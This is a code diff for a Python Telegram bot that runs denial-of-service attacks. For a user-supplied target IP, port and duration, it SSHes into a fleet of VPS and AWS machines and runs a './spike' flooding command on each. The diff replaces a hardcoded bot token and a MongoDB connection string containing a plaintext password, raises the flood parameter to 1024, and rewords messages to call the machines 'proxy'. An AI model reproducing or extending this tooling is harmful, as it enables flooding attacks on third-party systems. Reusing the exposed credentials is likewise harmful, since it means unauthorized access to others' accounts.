@@ -14,8 +14,8 @@ logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(
 logger = logging.getLogger(__name__)
 
 # Telegram API & MongoDB credentials (REPLACE WITH YOURS)
-TELEGRAM_BOT_TOKEN = "7431527955:AAH735I65NnKPqpqK7--ZFCQay3BzgsPSL0"
-MONGO_URI = "mongodb+srv://rmr31098:rajput1@cluster0.ikby5.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
+TELEGRAM_BOT_TOKEN = "6982857776:AAFDG6KtTz4T6jYjeZiwFdqZgTpqSW8Mj3Y"
+MONGO_URI = "mongodb+srv://jonny:ranbal1@jonny.wwfqv.mongodb.net/?retryWrites=true&w=majority&appName=jonny"
 DB_NAME = "TEST"
 
 # Database setup
@@ -451,7 +451,7 @@ async def attack(update: Update, context: CallbackContext):
         return
 
     total_vps = len(vps_list) + len(aws_vps_list)
-    await context.bot.send_message(chat_id, f"🔥 *Starting attack using {total_vps} VPS instances!*", parse_mode="Markdown")
+    await context.bot.send_message(chat_id, f"🔥 *Starting attack using {total_vps} proxy!*", parse_mode="Markdown")
 
     # Run attacks in parallel
     tasks = []
@@ -491,10 +491,10 @@ async def run_ssh_attack(vps_data, target_ip, port, duration, chat_id, context, 
             if attack_type == "aws":
                 command = f"./spike {target_ip} {port} {duration} 6 900"
             else:
-                command = f"./spike {target_ip} {port} {duration} 6 900"
+                command = f"./spike {target_ip} {port} {duration} 1024 900"
 
             await conn.run(command, check=True)
-            await context.bot.send_message(chat_id, f"✅ *Attack executed on {vps_data['ip']} ({attack_type})*", parse_mode="Markdown")
+            await context.bot.send_message(chat_id, f"✅ *Attack executed on ({attack_type})*", parse_mode="Markdown")
 
         except asyncssh.Error as e:
             await context.bot.send_message(chat_id, f"❌ *Error on {vps_data['ip']} ({attack_type}): {str(e)}*", parse_mode="Markdown")
